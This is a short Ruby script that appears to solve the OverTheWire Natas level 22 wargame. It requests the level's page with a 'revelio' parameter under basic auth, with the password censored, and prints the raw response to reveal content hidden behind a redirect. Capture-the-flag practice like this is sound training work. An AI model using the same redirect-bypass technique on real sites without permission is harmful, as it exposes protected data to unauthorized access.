require 'uri'
require 'net/http'

url = URI.parse("http://natas22.natas.labs.overthewire.org/index.php?revelio")
http = Net::HTTP.new(url.host, url.port)

request = Net::HTTP::Get.new(url.request_uri)
request.basic_auth("natas22", "<censored>")
response = http.request(request)

puts response.body
